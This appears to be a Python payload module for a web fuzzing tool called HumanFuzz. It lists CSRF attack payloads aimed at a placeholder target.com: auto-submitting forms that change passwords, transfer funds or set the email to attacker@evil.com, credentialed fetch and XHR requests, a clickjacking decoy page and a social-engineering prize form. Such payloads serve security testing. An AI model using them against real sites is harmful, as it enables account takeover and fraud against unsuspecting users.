"""
CSRF (Cross-Site Request Forgery) payload module for HumanFuzz.
"""

from typing import List
from humanfuzz.payloads import Payload

def get_payloads(field_type: str = None) -> List[Payload]:
    """
    Get CSRF payloads, optionally filtered by field type.
    
    Args:
        field_type: Type of the field (optional)
        
    Returns:
        List of Payload objects
    """
    # Basic CSRF payloads - HTML forms that auto-submit
    basic_payloads = [
        Payload("""<form id="csrf-form" action="https://target.com/change_password" method="POST">
                    <input type="hidden" name="new_password" value="hacked123">
                    <input type="hidden" name="confirm_password" value="hacked123">
                </form>
                <script>document.getElementById("csrf-form").submit();</script>""", 
                "csrf", "Basic Password Change", 
                "Basic CSRF to change user password"),
        
        Payload("""<form id="csrf-form" action="https://target.com/transfer" method="POST">
                    <input type="hidden" name="recipient" value="attacker">
                    <input type="hidden" name="amount" value="1000">
                </form>
                <script>document.getElementById("csrf-form").submit();</script>""", 
                "csrf", "Fund Transfer", 
                "CSRF to transfer funds to attacker"),
        
        Payload("""<form id="csrf-form" action="https://target.com/api/user/settings" method="POST">
                    <input type="hidden" name="email" value="attacker@evil.com">
                </form>
                <script>document.getElementById("csrf-form").submit();</script>""", 
                "csrf", "Email Change", 
                "CSRF to change user email"),
    ]
    
    # Advanced CSRF payloads - Using fetch API and other techniques
    advanced_payloads = [
        Payload("""<script>
                    fetch('https://target.com/api/user/settings', {
                        method: 'POST',
                        credentials: 'include',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            email: 'attacker@evil.com',
                            notifications: false
                        })
                    });
                </script>""", 
                "csrf", "Fetch API", 
                "CSRF using Fetch API with JSON payload"),
        
        Payload("""<script>
                    var xhr = new XMLHttpRequest();
                    xhr.open('POST', 'https://target.com/api/user/settings', true);
                    xhr.withCredentials = true;
                    xhr.setRequestHeader('Content-Type', 'application/json');
                    xhr.send(JSON.stringify({
                        email: 'attacker@evil.com',
                        notifications: false
                    }));
                </script>""", 
                "csrf", "XMLHttpRequest", 
                "CSRF using XMLHttpRequest with JSON payload"),
    ]
    
    # CSRF with clickjacking elements
    clickjacking_payloads = [
        Payload("""<style>
                    iframe {
                        width: 500px;
                        height: 500px;
                        position: absolute;
                        top: -1000px;
                        left: -1000px;
                        opacity: 0.00001;
                        z-index: 2;
                    }
                    div.decoy {
                        width: 500px;
                        height: 500px;
                        position: absolute;
                        top: 0px;
                        left: 0px;
                        z-index: 1;
                        background-color: #fff;
                    }
                </style>
                <div class="decoy">
                    <h1>Win a Free Prize!</h1>
                    <button style="position:absolute;top:300px;left:200px;">Click Here!</button>
                </div>
                <iframe src="https://target.com/settings"></iframe>""", 
                "csrf", "Clickjacking", 
                "CSRF combined with clickjacking technique"),
    ]
    
    # CSRF with social engineering elements
    social_payloads = [
        Payload("""<h1>You've Won a Prize!</h1>
                <p>Click the button below to claim your reward!</p>
                <form id="csrf-form" action="https://target.com/api/user/settings" method="POST">
                    <input type="hidden" name="email" value="attacker@evil.com">
                    <input type="submit" value="Claim Your Prize Now!">
                </form>""", 
                "csrf", "Social Engineering", 
                "CSRF with social engineering elements"),
    ]
    
    # CSRF with CORS bypass attempts
    cors_payloads = [
        Payload("""<script>
                    fetch('https://target.com/api/user/settings', {
                        method: 'POST',
                        credentials: 'include',
                        mode: 'no-cors',
                        headers: {
                            'Content-Type': 'text/plain',
                        },
                        body: 'email=attacker@evil.com&notifications=false'
                    });
                </script>""", 
                "csrf", "CORS Bypass", 
                "CSRF attempting to bypass CORS restrictions"),
    ]
    
    # Combine all payloads
    all_payloads = basic_payloads + advanced_payloads + clickjacking_payloads + social_payloads + cors_payloads
    
    # Filter by field type if specified
    if field_type:
        # CSRF payloads are typically not field-specific
        # but we can return different subsets based on context
        if field_type in ["hidden", "submit"]:
            return basic_payloads
        elif field_type in ["button", "image"]:
            return clickjacking_payloads + social_payloads
    
    return all_payloads
